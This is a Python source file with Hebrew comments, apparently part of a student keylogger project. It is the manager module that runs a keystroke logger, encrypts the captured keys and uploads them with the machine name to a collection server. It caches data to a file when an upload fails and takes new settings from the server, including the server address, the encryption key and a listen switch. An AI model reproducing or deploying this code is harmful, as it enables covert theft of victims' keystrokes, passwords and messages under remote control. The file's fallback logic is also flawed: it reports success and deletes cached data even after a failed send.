import json
import time
import socket

from file_writer import FileWriter
from keylogger_service import KeyLogger
from encryptor import Encryptor
from network_writer import NetworkWriter

class Manager:
    def __init__(self):
        self.time_network = 5
        self.server_url = "http://127.0.0.1:5000/api/upload"
        self.status_listen = True
        self.key_encryptor = "nmrd"

        self.machine_name = socket.gethostname()
        self.file_writer = FileWriter()
        self.service = KeyLogger(self.machine_name)
        self.encryptor = Encryptor(self.key_encryptor)
        self.network_writer = NetworkWriter(self.server_url)

    def timer(self):
        time.sleep(self.time_network)

    def stop_and_continue(self):
        self.service.stop_and_continue(self.status_listen)

    def handle_response(self, response_data: dict):
        """
        מקבל dict מהשרת ומעדכן את השדות שקיימים בו.
        שדות שלא קיימים ב-response נשארים עם הערך הקודם שלהם.
        """
        settings = response_data.get("settings", {})
        if "time_network" in settings:
            self.time_network = settings["time_network"]

        if "key_encryptor" in settings:
            self.key_encryptor = settings["key_encryptor"]

        if "server_url" in settings:
            self.server_url = settings["server_url"]

        if "status_listen" in settings:
            self.status_listen = settings["status_listen"]
        self.stop_and_continue()
        print(settings, self.status_listen)

    def file_write(self, data):
        self.file_writer.send_data(data, self.machine_name)

    def delete_file(self,machine_name):
        self.file_writer.delete_file(machine_name)

    def file_content(self):
            data = self.file_writer.read_data(self.machine_name)
            if data is None:
                return
            res = self.network_writer.send_data(data,self.machine_name)
            if res is None or res.status_code != 200:
                print("שליחה מהקובץ נכשלה הנתונים יחזרו לקובץ.")
            print("הנתונים מהקובץ נשלחו בהצלחה.")
            self.delete_file(self.machine_name)

    def manage(self):
        self.service.start()
        while True:
            try:
                self.timer()                                                                 # המתנה בין כל שליחה
                data = self.service.get_and_clear_buffer()                              # שלב 1: מושך נתונים מהבאפר של השירות ומנקה אותו
                print(data)
                encrypted_data = self.encryptor.encrypt_dict(data)                      # שלב 2: מצפין את הנתונים לפני השליחה
                res = self.network_writer.send_data(encrypted_data, self.machine_name)  # שלב 3: מנסה לשלוח את הנתונים

                if res is None or res.status_code != 200:
                    print("שליחה נכשלה. שומר את הנתונים לקובץ.")
                    self.file_write(encrypted_data)
                    continue                                                            # ממשיך ללולאה הבאה
                print("הנתונים נשלחו בהצלחה.")                                           # אם הגעת לכאן, הכל תקין (קוד0 200)
                res_data = res.json()
                self.handle_response(res_data)
                self.file_content()
            except Exception as e:
                print(e)


if __name__ == "__main__":
    manager = Manager()

    try:
        manager.manage()
    except KeyboardInterrupt:
        print("\nהמנהל הופסק.")
